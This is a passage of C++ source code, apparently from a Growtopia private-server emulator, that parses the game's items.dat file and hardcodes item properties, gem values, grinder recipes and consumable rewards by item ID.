		memPos += 1;
		int16_t strLen = *(int16_t*)&data[memPos];
		memPos += 2;
		for (int j = 0; j < strLen; j++) {
			def.name += data[memPos] ^ (key_[(j + def.id) % key_.length()]);
			memPos++;
		}
		strLen = *(int16_t*)&data[memPos];
		memPos += 2;
		for (int j = 0; j < strLen; j++) {
			//def.texture += data[memPos];
			memPos++;
		}
		//memcpy(&def.textureHash, data + memPos, 4);
		memPos += 4;
		//def.itemKind = memPos[data];
		memPos += 1;
		//memcpy(&def.val1, data + memPos, 4);
		memPos += 4;
		//def.textureX = data[memPos];
		memPos += 1;
		//def.textureY = data[memPos];
		memPos += 1;
		//def.spreadType = data[memPos];
		memPos += 1;
		//def.isStripeyWallpaper = data[memPos];
		memPos += 1;
		def.collisionType = data[memPos];
		memPos += 1;

		/*
		memcpy(&def.breakHits, data + memPos, 4);
		def.breakHits /= 6;*/


		if (data[memPos] == 6 || data[memPos] == 0) {
			def.breakHits = 10;
		}
		if (data[memPos] == 12) def.breakHits = 2;
		if (data[memPos] == 18) def.breakHits = 3;
		if (data[memPos] == 24) def.breakHits = 4;
		if (data[memPos] == 30) def.breakHits = 5;
		if (data[memPos] == 36 || def.id == 9816) def.breakHits = 6;
		if (data[memPos] == 42) def.breakHits = 7;
		if (data[memPos] == 48) def.breakHits = 8;
		if (data[memPos] == 54) def.breakHits = 9;
		if (data[memPos] == 60) def.breakHits = 10;
		if (data[memPos] == 60) def.breakHits = 11;
		if (data[memPos] == 72) def.breakHits = 12;
		if (data[memPos] == 90) def.breakHits = 15;
		if (data[memPos] == 120) def.breakHits = 20;
		if (data[memPos] == -76) def.breakHits = 24;
		if (data[memPos] == -106 || def.actionType == 111 || def.actionType == 123 || def.actionType == 124 || def.actionType == 125) def.breakHits = 25;
		if (data[memPos] == -4 || def.id == 13056) def.breakHits = 42;

		//if (def.breakHits == 0) 			cout << def.id << "|" << def.breakHits << "|" << data[memPos] * 1 << endl;

		if (def.id == 9560)  def.breakHits = 9000;
		if (def.id == 9572)  def.breakHits = 1;
		if (def.id == 9162) def.breakHits = 7;
		memPos += 1;
		memcpy(&def.dropChance, data + memPos, 4);
		memPos += 4;
		def.clothingType = data[memPos];
		memPos += 1;
		memcpy(&def.rarity, data + memPos, 2);
		memPos += 2;
		//def.maxAmount = data[memPos];
		memPos += 1;
		strLen = *(int16_t*)&data[memPos];
		memPos += 2;
		for (int j = 0; j < strLen; j++) {
			def.extraFile += data[memPos];
			memPos++;
		}
		//memcpy(&def.extraFileHash, data + memPos, 4);
		if (def.extraFile.find("mp3") != string::npos) def.musical_block = true;
		memPos += 4;
		memcpy(&def.base_weather, data + memPos, 4);
		memPos += 4;
		strLen = *(int16_t*)&data[memPos];
		memPos += 2;
		for (int j = 0; j < strLen; j++) {
			//def.petName += data[memPos];
			memPos++;
		}
		strLen = *(int16_t*)&data[memPos];
		memPos += 2;
		for (int j = 0; j < strLen; j++) {
			//def.petPrefix += data[memPos];
			memPos++;
		}
		strLen = *(int16_t*)&data[memPos];
		memPos += 2;
		for (int j = 0; j < strLen; j++) {
			//def.petSuffix += data[memPos];
			memPos++;
		}
		strLen = *(int16_t*)&data[memPos];
		memPos += 2;
		for (int j = 0; j < strLen; j++) {
			//def.petAbility += data[memPos];
			memPos++;
		}
		//def.seedBase = data[memPos];
		memPos += 1;
		//def.seedOverlay = data[memPos];
		memPos += 1;
		//def.treeBase = data[memPos];
		memPos += 1;
		//def.treeLeaves = data[memPos];
		memPos += 1;
		//memcpy(&def.seedColor, data + memPos, 4);
		memPos += 4;
		//memcpy(&def.seedOverlayColor, data + memPos, 4);
		memPos += 4;
		memPos += 4;
		memcpy(&def.growTime, data + memPos, 4);
	//	def.growTime /= 3;
		memPos += 4;
		//memcpy(&def.val2, data + memPos, 2);
		memPos += 2;
		//memcpy(&def.isRayman, data + memPos, 2);
		memPos += 2;
		strLen = *(int16_t*)&data[memPos];
		memPos += 2;
		for (int j = 0; j < strLen; j++) {
			//def.extraOptions += data[memPos];
			memPos++;
		}
		strLen = *(int16_t*)&data[memPos];
		memPos += 2;
		for (int j = 0; j < strLen; j++) {
		//	def.texture2 += data[memPos];
			memPos++;
		}
		strLen = *(int16_t*)&data[memPos];
		memPos += 2;
		for (int j = 0; j < strLen; j++) {
			//def.extraOptions2 += data[memPos];
			memPos++;
		}
		memPos += 80;
		if (itemsdatVersion >= 11) {
			strLen = *(int16_t*)&data[memPos];
			memPos += 2;
			for (int j = 0; j < strLen; j++) {
			//	def.punchOptions += data[memPos];
				memPos++;
			}
		}
		if (itemsdatVersion >= 12) memPos += 13;
		if (itemsdatVersion >= 13) memPos += 4;
		if (itemsdatVersion >= 14) memPos += 4;
		if (itemsdatVersion >= 15) {
			memPos += 25;
			int16_t strLen = *(int16_t*)&data[memPos];
			memPos += 2 + strLen;
		}
		if (itemsdatVersion >= 16) memPos += 2;
		if (i != def.id) {
			cout << i << endl;
			return -1;
		}
		string category = getItemCategory(def.actionType, def.name);
	//	if (def.actionType == 98) cout << def.id << endl;
		//if (def.actionType == -115) def.kranken = 1;
		if (def.actionType == 127 || def.actionType == 126 || def.actionType == 118 || def.actionType == 117 || def.actionType == 116 || def.actionType == 115 || def.actionType == 113 || def.actionType == 109 || def.actionType == 106 || def.actionType == 105 || def.actionType == 104 || def.actionType == 102 || def.actionType == 99 || def.actionType == 96|| def.actionType == 86 || def.actionType == 80 || def.actionType == 79 || def.actionType == 78 || def.actionType == 77 || def.actionType == 75|| def.actionType == 73 || def.actionType == 72 || def.actionType == 71 || def.actionType == 68  || def.actionType == 66 || def.actionType == 65 || def.actionType == 57 || def.actionType == 53 || def.actionType == 52 || def.actionType == 50 || def.actionType == 43 || def.actionType == 40 || def.actionType == 91 || def.id == 5818 || def.id == 5820 || def.id == 6280) def.blocked_place = true;
		if (def.id == 3832 || def.id == 6016 || def.id == 1436 || def.id == 8246 || def.id == 10258 || def.id == 2646) def.blocked_place = false;
		if (def.blocked_place) def.simple_load = true;
		if (def.id == 4632 or def.id == 4630) { def.audio_rack = true; def.simple_load = false; def.blocked_place = false; }
		string clothingType_ = "";
		if (def.actionType == 107) {
			category = "Clothing";
			clothingType_ = "Ances";
		}
		if (def.actionType == 20) {
			switch (def.clothingType) {
			case 0: clothingType_ = "Hair";
				break;
			case 1: clothingType_ = "Shirt";
				break;
			case 2: clothingType_ = "Pants";
				break;
			case 3: clothingType_ = "Feet";
				break;
			case 4: clothingType_ = "Face";
				break;
			case 5: clothingType_ = "Hand";
				break;
			case 6: clothingType_ = "Back";
				break;
			case 7: clothingType_ = "Mask";
				break;
			case 8: clothingType_ = "Necklace";
				break;
			case 9: clothingType_ = "Ances";
				break;
			default: break;
			}
		}
		if ((def.id % 2) == 1) category = "Seed";
		vector<string> prop_ = get_properties(def.actionType, def.itemCategory);
		string thisss = (prop_.empty() ? "0" : join(prop_, ','));
		vector<string> properties = explode(",", thisss);
		def.properties = Property_Zero;
		for (string& prop : properties) {
			if (prop == "NoSeed") {
				def.properties += Property_NoSeed;
			} if (prop == "Dropless") {
				def.properties += Property_Dropless;
			} if (prop == "Beta") {
				def.properties += Property_Beta;
			} if (prop == "Mod") {
				def.properties += Property_Mod;
			} if (prop == "Untradable") {
				def.properties += Property_Untradable;
				def.untradeable = 1;
			} if (prop == "Wrenchable") {
				def.properties += Property_Wrenchable;
			} if (prop == "MultiFacing") {
				def.properties += Property_MultiFacing;
			} if (prop == "Permanent") {
				def.properties += Property_Permanent;
			} if (prop == "AutoPickup") {
				def.properties += Property_AutoPickup;
			} if (prop == "WorldLock") {
				def.properties += Property_WorldLock;
			} if (prop == "NoSelf") {
				def.properties += Property_NoSelf;
			} if (prop == "RandomGrow") {
				def.properties += Property_RandomGrow;
			} if (prop == "Public" && def.id != 6852) {
				def.properties += Property_Public;
			} if (prop == "Foreground") {
				def.properties += Property_Foreground;
			} if (prop == "OnlyCombiner") {
				def.properties += Property_Chemical;
			}
		}
		if (def.id == 9570)def.properties += Property_Mod;
		if (def.id == 9828) 	def.properties = Property_Zero;
		if (def.id == 12958 || def.id == 9862 || def.id == 9864 || def.id == 9866 || def.id == 9868 || def.id == 9920 || def.id == 7188 || def.id == 10018 || def.id == 10120 || def.id == 10122 || def.id == 10124 || def.id == 10118) {
			def.untradeable = 0;
			def.properties &= ~Property_Untradable;
		}
		if (def.id == 9726 || def.id == 10934 || def.id == 10384 || def.id == 9846 || def.id == 9774 || def.id == 8430 || def.id == 9852 || def.id == 9854 || def.id == 9882 || def.id == 9896 || def.id == 10372 || def.id == 10400) {
			def.untradeable = 1;
			def.properties += Property_Untradable;
		}
		def.blockType = get_blocktype(category, def.name);
		if (def.id == 11138) {
			def.blockType = VIP_ENTRANCE;
		}
		else if (def.id == 6954) {
			def.blockType = SUCKER;
		}
		else if (def.id == 10258 || def.id == 1436 || def.id == 8246) {
			def.blockType = CCTV;
		}
		else if (def.actionType == 81 or def.id == 5958 or def.id == 12054) {
			def.blockType = WEATHER;
		}
		if (def.blockType == GAME_BLOCK or def.blockType == GAME_GENERATOR) { def.simple_load = false; def.blocked_place = false; }
		def.clothType = get_clothtype(clothingType_, def.blockType);
		def.effect = get_punch_id(def.id);
		def.ori_name = fixchar2(def.name);
		items.push_back(def);
		if (items[def.id].properties & Property_RandomGrow) {
			if (def.name.find("Tangram Block") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "Tangram Block Seed" : "Tangram Block");
			else if (def.name.find("Card Block") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "Card Block Seed" : "Card Block");
			else if (def.name.find("Growsaber") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "Growsaber Seed" : "Growsaber");
			else if (def.name.find("Surgical") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "Surgical Tool Seed" : "Surgical Tool");
			else if (def.name.find("Super Shirt") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "Super Shirt Seed" : "Super Shirt");
			else if (def.name.find("Muscle Shirt") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "Muscle Shirt Seed" : "Muscle Shirt");
			else if (def.name.find("Heroic Tights") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "Heroic Tights Seed" : "Heroic Tights");
			else if (def.name.find("Super Tights") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "Super Tights Seed" : "Super Tights");
			else if (def.name.find("Heroic Boots") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "Heroic Boots Seed" : "Heroic Boots");
			else if (def.name.find("Superhero Mask") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "Superhero Mask Seed" : "Superhero Mask");
			else if (def.name.find("Crimefighter Mask") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "Crimefighter Mask Seed" : "Crimefighter Mask");
			else if (def.name.find("Super Cape") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "Super Cape Seed" : "Super Cape");
			else if (def.name.find("Superheroine Top") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "Superheroine Top Seed" : "Superheroine Top");
			else if (def.name.find("Super Eye Mask") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "Super Eye Seed" : "Super Eye");
			else if (def.name.find("Super Logo") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "Super Logo Seed" : "Super Logo");
			else if (def.name.find("Superpower") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "Superpower Seed" : "Superpower");
			else if (def.name.find("Villain Portrait") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "Villain Portrait Seed" : "Villain Portrait");
			else if (def.name.find("Super Logo") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "Super Logo Seed" : "Super Logo");
			else if (def.name.find("Fashionable Dress") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "Fashionable Dress Seed" : "Fashionable Dress");
			else if (def.name.find("Stylin' Dress") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "Stylin' Dress Seed" : "Stylin' Dress");
			else if (def.name.find("High Heels") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "High Heels Seed" : "High Heels");
			else if (def.name.find("Fashion Purse") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "Fashion Purse Seed" : "Fashion Purse");
			else if (def.name.find("Number Block") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "Number Block Seed" : "Number Block");
			else if (def.name.find("Number") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "Number Seed" : "Number");
			else if (def.name.find("Paint Bucket") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "Paint Bucket Seed" : "Paint Bucket");
			else if (def.name.find("Crayon") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "Crayon Block Seed" : "Crayon Block");
			else if (def.name.find("Command") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "Command Tool Seed" : "Command Tool");
			else if (def.name.find("Growmoji") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "Growmoji Seed" : "Growmoji");
			else if (def.name.find("Guild Flag") != string::npos)
				items[def.id].name = (def.name.find("Seed") != string::npos ? "Guild Flag Seed" : "Guild Flag");
			else {
				int a_ = 0;
				int last_id = 0;
				while (items[def.id - a_].properties & Property_RandomGrow) {
					if (items[def.id - a_].blockType != BlockTypes::SEED) last_id = def.id - a_;
					a_++;
				}
				items[def.id].name = (def.name.find("Seed") != string::npos ? items[last_id + 1].name : items[last_id].name);
			}
		}

		if (i == 9266)items[i].max_gems3 = 100;
		if (i == 6856)items[i].max_gems3 = 100;
		if (i == 6858)items[i].max_gems3 = 200;
		if (i == 6860 || i == 8186)items[i].max_gems3 = 4000;
		if (i == 8188 || i == 6862)items[i].max_gems3 = 8000;
		if (i == 6142 || i == 1240 || items[i].actionType == -115 || i == 9080) items[i].multiple_sides = 1;
		if (i == 834 || i == 611 || i == 914 || i == 916 || i == 918 || i == 920 || i == 874)items[i].max_gems3 = 1;
		if (i == 202)items[i].max_gems3 = 5;
		if (i == 838 || i == 840 || i == 844 || i == 390 || i == 540 || i == 922 || i == 388 || i == 386)items[i].max_gems3 = 10;
		if (i == 204) items[i].max_gems3 = 20;
		if (i == 8534)items[i].max_gems3 = 25;
		if (i == 720 || i == 206 || i == 528 || i == 8500) items[i].max_gems3 = 50;
		if (i == 366 || i == 932 || i == 542 || i == 882)items[i].max_gems3 = 100;
		if ( i == 710)items[i].max_gems3 = 200;
		if (i == 930 || i == 768 || i == 672 || i == 830 || i == 1008 || i == 8542)items[i].max_gems3 = 250;
		if (i == 242)items[i].max_gems3 = 300;
		if (i == 1240)items[i].max_gems3 = 400; 
		if (i == 362 || i == 692)items[i].max_gems3 = 500;
		if (i == 898) items[i].max_gems3 = 750;
		if (i == 946 || i == 934 || i == 984 || i == 276 || i == 274 || i == 408|| i == 11432 || i == 4490)items[i].max_gems3 = 1000;
		if (i == 10394) items[i].max_gems3 = 1000;
		if (i == 574 || i == 592 || i == 766 || i == 760 || i == 1012) items[i].max_gems3 = 2500;
		if (i == 1400 || i == 900)items[i].max_gems3 = 5000;
		if (i == 1796) items[i].max_gems3 = 30000;
		if (i == 7188) items[i].max_gems3 = 300000;
		if (i == 5138)items[i].max_gems3 = 10000;
		if (i == 5140)items[i].max_gems3 = 50000;
		if (i == 5142)items[i].max_gems3 = 100000;
		if (i == 9816)items[i].max_gems3 = 300;


		if (i == 3870) {
			items[i].grindable_count = -50;
			items[i].epic.insert(items[i].epic.end(), { 1830, 3886, 5112, 7044, 8924, 10130, 10148, 11238 });
			items[i].rare.insert(items[i].rare.end(), { 7042 ,11272 });
			items[i].uncommon.insert(items[i].uncommon.end(), { 10142 ,10154,10142 ,10154 });
		}
		if (i == 1056) {
			items[i].grindable_count = -500;
			items[i].epic.insert(items[i].epic.end(), { 1830, 3886, 5112, 7044, 8924, 10130, 10148, 11238 });
			items[i].rare.insert(items[i].rare.end(), { 1806, 3894, 5200, 7038, 7040, 8914, 10160, 10162, 11274 });
			items[i].uncommon.insert(items[i].uncommon.end(), { 1060, 1062, 1060, 1062 });
		}
		if (i == 1058) {
			items[i].grindable_count = 200;
			items[i].epic.insert(items[i].epic.end(), { 5112 });
			items[i].uncommon.insert(items[i].uncommon.end(), { 1060, 7026, 7028, 7030, 10154, 11260,1060, 7026, 7028, 7030, 10154, 11260 });
		}
		if (i == 1094) {
			items[i].grindable_count = 200;
			items[i].rare.insert(items[i].rare.end(), { 8914, 5200 });
			items[i].uncommon.insert(items[i].uncommon.end(), { 1060, 7032, 11258, 11266,1060, 7032, 11258, 11266 });
		}
		if (i == 1096) {
			items[i].grindable_count = 200;
			items[i].rare.insert(items[i].rare.end(), { 3894, 7036 });
			items[i].uncommon.insert(items[i].uncommon.end(), { 7032, 10142,7032, 10142 });
		}
		if (i == 1098) {
			items[i].grindable_count = 200;
			items[i].rare.insert(items[i].rare.end(), { 7036,11242 });
			items[i].uncommon.insert(items[i].uncommon.end(), { 1062, 7026, 7028, 7030, 11258, 11260 , 1062, 7026, 7028, 7030, 11258, 11260 });
		}
		if (i == 1828) {
			items[i].grindable_count = -250;
			items[i].epic.insert(items[i].epic.end(), { 1830, 10148, 11250 });
			items[i].rare.insert(items[i].rare.end(), { 1068, 1806, 7038, 7040, 7042, 10152, 12378 });
			items[i].uncommon.insert(items[i].uncommon.end(), { 1810,1810 });
		}
		if (i == 11286) {
			items[i].grindable_count = -100;
			items[i].epic.insert(items[i].epic.end(), { 11238, 11250, 12386 });
			items[i].rare.insert(items[i].rare.end(), { 11242, 11246, 11252, 11272, 11274 });
			items[i].uncommon.insert(items[i].uncommon.end(), { 11258, 11260 , 11258, 11260 });
		}
		if (i == 7058) {
			items[i].grindable_count = -70;
			items[i].epic.insert(items[i].epic.end(), { 1830, 3886, 5112, 7044, 8924, 10130, 10148, 11238, 12376, 12390 });
			items[i].rare.insert(items[i].rare.end(), { 1806, 3894, 5200, 7036, 7038, 7040, 7042, 8914, 10152, 10160, 10162, 11274 });
			items[i].uncommon.insert(items[i].uncommon.end(), { 1060, 1062, 7026, 7028, 7030, 7032, 10142, 10154, 1060, 1062, 7026, 7028, 7030, 7032, 10142, 10154 });
		}

		if (i == 1058 || i == 1828 || i == 1096 || i == 1094 || i == 3870 || i == 7058 || i == 11286 || i == 1056 || i == 1098) items[i].mooncake = true;

		//grindable recipe
		if (i == 326) {
			items[i].grindable_count = 30;
			items[i].grindable_prize = 4586;
		}
		if (i == 4422 || i == 2564 || i == 2566 || i == 5372) {
			items[i].grindable_count = 20;
			items[i].grindable_prize = 4610;
		}
		if (i == 6956) {
			items[i].grindable_count = 1;
			items[i].grindable_prize = 6958;
		}
		if (i == 6972) {
			items[i].grindable_count = 5;
			items[i].grindable_prize = 6974;
		}
		if (i == 7002) {
			items[i].grindable_count = 12;
			items[i].grindable_prize = 7004;
		}
		if (i == 7050) {
			items[i].grindable_count = 20;
			items[i].grindable_prize = 7054;
		}
		if (i == 4668) {
			items[i].grindable_count = 50;
			items[i].grindable_prize = 4670;
		}
		if (i == 7012) {
			items[i].grindable_count = 1;
			items[i].grindable_prize = 7014;
		}
		if (i == 440) {
			items[i].grindable_count = 100;
			items[i].grindable_prize = 6314;
		}
		if (i == 880) {
			items[i].grindable_count = 50;
			items[i].grindable_prize = 4562;
		}
		if (i == 5348 || i == 5354 || i == 5352 || i == 5350) {
			items[i].grindable_count = 100;
			items[i].grindable_prize = 5416;
		}
		if (i == 4578) {
			items[i].grindable_count = 1;
			items[i].grindable_prize = 4580;
		}
		if (i == 7460) {
			items[i].grindable_count = 25;
			items[i].grindable_prize = 7462;
		}
		if (i == 192 || i == 1004) {
			items[i].grindable_count = 50;
			items[i].grindable_prize = 4564;
		}
		if (i == 4982) {
			items[i].grindable_count = 100;
			items[i].grindable_prize = 4984;
		}
		if (i == 4584) {
			items[i].grindable_count = 100;
			items[i].grindable_prize = 4570;
		}
		if (i == 712 || i == 960) {
			items[i].grindable_count = 1;
			items[i].grindable_prize = 4570;
		}
		if (i == 2734) {
			items[i].grindable_count = 50;
			items[i].grindable_prize = 4764;
		}
		if (i == 6988) {
			items[i].grindable_count = 10;
			items[i].grindable_prize = 6990;
		}
		if (i == 4566) {
			items[i].grindable_count = 100;
			items[i].grindable_prize = 4568;
		}
		if (i == 6998) {
			items[i].grindable_count = 2;
			items[i].grindable_prize = 7000;
		}
		if (i == 3404 || i == 3836) {
			items[i].grindable_count = 20;
			items[i].grindable_prize = 4572;
		}
		if (i == 3406) {
			items[i].grindable_count = 10;
			items[i].grindable_prize = 4572;
		}
		if (i == 954) {
			items[i].grindable_count = 100;
			items[i].grindable_prize = 4572;
		}
		if (i == 10268) {
			items[i].grindable_count = 3;
			items[i].grindable_prize = 10272;
		}


		// fire on highly conmutable box
			// Forgable Items
		if (i == 3182) items[i].grindable_prize = 3186;
		if (i == 3208) items[i].grindable_prize = 3242;
		if (i == 4176) items[i].grindable_prize = 4178;
		if (i == 3610) items[i].grindable_prize = 3612;
		if (i == 1706) items[i].grindable_prize = 3420;
		if (i == 4540) items[i].grindable_prize = 4542;
		if (i == 3948) items[i].grindable_prize = 6838;
		if (i == 9400) items[i].grindable_prize = 9402;
		if (i == 2290) items[i].grindable_prize = 3302;
		if (i == 3538) items[i].grindable_prize = 3540;
		// Clothes
		if (i == 1166) items[i].grindable_prize = 3104;
		if (i == 3060) items[i].grindable_prize = 3058;
		if (i == 3048) items[i].grindable_prize = 3046;
		if (i == 3056) items[i].grindable_prize = 3054;
		if (i == 98) items[i].grindable_prize = 3070;
		if (i == 3166) items[i].grindable_prize = 3168;
		if (i == 5496) items[i].grindable_prize = 5498;
		if (i == 6688) items[i].grindable_prize = 6678;
		if (i == 6690) items[i].grindable_prize = 6680;
		if (i == 6692) items[i].grindable_prize = 6682;
		if (i == 6696) items[i].grindable_prize = 6686;
		// Misc
		if (i == 3090) items[i].grindable_prize = 3128;
		if (i == 3584) items[i].grindable_prize = 3580;
		if (i == 866) items[i].grindable_prize = 3688;
		if (i == 4308) items[i].grindable_prize = 4338;
		if (i == 1012 || i == 592 || i == 1018 || i == 2402) items[i].grindable_prize = 5014;
		if (i == 2564) items[i].grindable_prize = 2566;
		if (i == 7344) items[i].grindable_prize = 7346;
		if (i == 5042) items[i].grindable_prize = 7702;



		if (i == 10268) {
			items[i].grindable_count = 3;
			items[i].grindable_prize = 10272;
		}


		// fire on highly conmutable box
			// Forgable Items
		if (i == 3182) items[i].grindable_prize = 3186;
		//consumable recipe
		if (i == 2410) {
			items[i].consume_needed = 200;
			items[i].consume_prize.push_back(2408);
		}
		if (i == 12370) {
			items[i].consume_needed = 200;
			items[i].consume_prize.push_back(4455);
		}
		if (i == 2036) {
			items[i].consume_needed = 200;
			items[i].consume_prize.push_back(2037);
		}
		if (i == 1152) {
			items[i].consume_needed = 10;
			items[i].consume_prize.push_back(1150);
		}
		if (i == 1212) {
			items[i].consume_needed = 25;
			items[i].consume_prize.push_back(1190);
		}
		if (i == 2034) {
			items[i].consume_needed = 200;
			items[i].consume_prize.push_back(2035);
		}
		if (i == 1234) {
			items[i].consume_needed = 4;
			items[i].consume_prize.push_back(1206);
		}
		if (i == 3110) {//vampire cape
			items[i].consume_needed = 25;
			items[i].consume_prize.push_back(1166);
		}
		if (i == 8936) {//vampire cape
			items[i].consume_needed = 200;
			items[i].consume_prize.push_back(8938);
		}
		if (i == 13158) {
			items[i].consume_needed = 100;
			items[i].consume_prize.insert(items[i].consume_prize.end(), { 13218, 13212, 13214, 13216, 13202, 13204, 13206, 13170, 13174, 13234, 13238, 13222, 13226, 13224, 13254, 13244, 13252, 13250, 13182, 13198, 13178 ,13180, 13256 });	}
		if (i == 4236) {// extractium shard
			items[i].consume_needed = 10;
			items[i].consume_prize.push_back(4234);
		}
		if (i == 12766) {
			items[i].consume_needed = 100;
			items[i].consume_prize.push_back(12768);
		}
		if (i == 5636) {//uranium glwoing lure
			items[i].consume_needed = 10;
			items[i].consume_prize.push_back(5526);
		}
		if (i == 6330) {//embers
			items[i].consume_needed = 100;
			items[i].consume_prize.push_back(6332);
		}
		if (i == 8936) {//wood chips
			items[i].consume_needed = 200;
			items[i].consume_prize.push_back(8938);
		}
		if (i == 3242) {// tempered axe fragment
			items[i].consume_needed = 100;
			items[i].consume_prize.push_back(3244);
		}
		if (i == 3186) {// tempered setel fragment
			items[i].consume_needed = 100;
			items[i].consume_prize.push_back(3190);
		}
		if (i == 5282) {// celestial dust
			items[i].consume_needed = 100;
			items[i].consume_prize.push_back(5284);
		}
		if (i == 4172) {// demonc skkulls
			items[i].consume_needed = 100;
			items[i].consume_prize.push_back(4174);
		}
		if (i == 4426) {// ruby shard
			items[i].consume_needed = 200;
			items[i].consume_prize.push_back(4428);
		}
		if (i == 2412) {// cloverleaf
			items[i].consume_needed = 4;
			items[i].consume_prize.push_back(528);
		}
		if (i == 2000) {//skeletal dragon
			items[i].consume_needed = 20;
			items[i].consume_prize.push_back(1998);
		}
		if (i == 7590) {
			items[i].consume_needed = 100;
			items[i].consume_prize.push_back(7592);
		}
		if (i == 11656) {
			items[i].consume_needed = 100;
			items[i].consume_prize.push_back(11658);
		}
		if (i == 2290) {
			items[i].consume_needed = 100;
			items[i].consume_prize.push_back(2282);
		}
		if (i == 3122) {
			items[i].consume_needed = 16;
			items[i].consume_prize.push_back(3120);
		}
		if (i == 3762) {
			items[i].consume_needed = 100;
			items[i].consume_prize.push_back(3744);
		}
		if (i == 8534) {
			items[i].consume_needed = 100;
			items[i].consume_prize.push_back(8536);
		}
		if (i == 5256) {
			items[i].consume_needed = 100;
			items[i].consume_prize.insert(items[i].consume_prize.end(), { 5234 });
		}

		//growganoth
		if (i == 11666) items[i].consume_prize.push_back(12414);
		if (i == 11574) items[i].consume_prize.push_back(12772);
		if (i == 7026 || i == 7028 || i == 7030) items[i].consume_prize.push_back(12396);
		if (i == 10652) items[i].consume_prize.push_back(12420);
		if (i == 10148) items[i].consume_prize.push_back(12418);
		if (i == 11534) items[i].consume_prize.push_back(12416);
		if (i == 11638) items[i].consume_prize.push_back(12780);
		if (i == 1950) items[i].consume_prize.push_back(4152);
		if (i == 2722) items[i].consume_prize.push_back(3114);
		if (i == 910) items[i].consume_prize.push_back(1250);
		if (i == 11046) items[i].consume_prize.push_back(11314);
		if (i == 94 || i == 604 || i == 2636 || i == 2908) items[i].consume_prize.push_back(3108);
		if (i == 274 || i == 276) items[i].consume_prize.push_back(1956);
		if (i == 6300) items[i].consume_prize.push_back(7102);
		if (i == 10730) items[i].consume_prize.push_back(11332);
		if (i == 10734) items[i].consume_prize.push_back(11336);
		if (i == 10732) items[i].consume_prize.push_back(11334);
		if (i == 6176) items[i].consume_prize.push_back(9042);
		if (i == 3040) items[i].consume_prize.push_back(3100);
		if (i == 6144) items[i].consume_prize.push_back(7104);
		if (i == 7998) items[i].consume_prize.push_back(9048);
		if (i == 1162) items[i].consume_prize.push_back(3126);
		if (i == 9322) items[i].consume_prize.push_back(10184);
		if (i == 7696) items[i].consume_prize.push_back(10186);
		if (i == 1474) items[i].consume_prize.push_back(1990);
		if (i == 1506) items[i].consume_prize.push_back(1968);
		if (i == 2386) items[i].consume_prize.push_back(4166);
		if (i == 9364) items[i].consume_prize.push_back(10206);
		if (i == 10576) items[i].consume_prize.push_back(11322);
		if (i == 4960) items[i].consume_prize.push_back(5208);
		if (i == 6196) items[i].consume_prize.push_back(9056);
		if (i == 4326) items[i].consume_prize.push_back(7122);
		if (i == 2860 || i == 2268) items[i].consume_prize.push_back(4172);
		if (i == 1114) items[i].consume_prize.push_back(4156);
		if (i == 362) items[i].consume_prize.push_back(1234);
		if (i == 4334) items[i].consume_prize.push_back(5250);
		if (i == 1408) items[i].consume_prize.push_back(5254);
		if (i == 4338) items[i].consume_prize.push_back(5252);
		if (i == 3288) items[i].consume_prize.push_back(4138);
		if (i == 3296) items[i].consume_prize.push_back(4146);
		if (i == 3290) items[i].consume_prize.push_back(4140);
		if (i == 3292) items[i].consume_prize.push_back(4142);
		if (i == 3298) items[i].consume_prize.push_back(4148);
		if (i == 3294) items[i].consume_prize.push_back(4144);
		//Dragon bone
		if (i == 900 || i == 7754 || i == 7136 || i == 1576 || i == 7752 || i == 1378 || i == 7758 || i == 7760 || i == 7748) items[i].consume_prize.push_back(2000);
		//...
		if (i == 1746) items[i].consume_prize.push_back(1960);
		if (i == 5018) items[i].consume_prize.push_back(5210);
		if (i == 1252) items[i].consume_prize.push_back(1948);
		if (i == 1190) items[i].consume_prize.push_back(1214);
		if (i == 2868) items[i].consume_prize.push_back(7100);
		if (i == 1830) items[i].consume_prize.push_back(1966);
		if (i == 916 || i == 918 || i == 920 || i == 922 || i == 924 || i == 2038 || i == 2206 || i == 4444) items[i].consume_prize.push_back(1962);
		if (i == 3556) items[i].consume_prize.push_back(4188);//same drop different item
		if (i == 762) items[i].consume_prize.push_back(4190);
		if (i == 3818) items[i].consume_prize.push_back(10192);
		if (i == 366) items[i].consume_prize.push_back(4136);
		if (i == 9262) items[i].consume_prize.push_back(10212);
		if (i == 1294) items[i].consume_prize.push_back(5236);
		if (i == 1242) items[i].consume_prize.push_back(5216);
		if (i == 1244) items[i].consume_prize.push_back(5218);
		if (i == 1248) items[i].consume_prize.push_back(5220);
		if (i == 1246) items[i].consume_prize.push_back(5214);
		if (i == 3016) items[i].consume_prize.push_back(4248);
		if (i == 5528) items[i].consume_prize.push_back(4248);
		if (i == 3018) items[i].consume_prize.push_back(4248);
		if (i == 5526) items[i].consume_prize.push_back(4248);
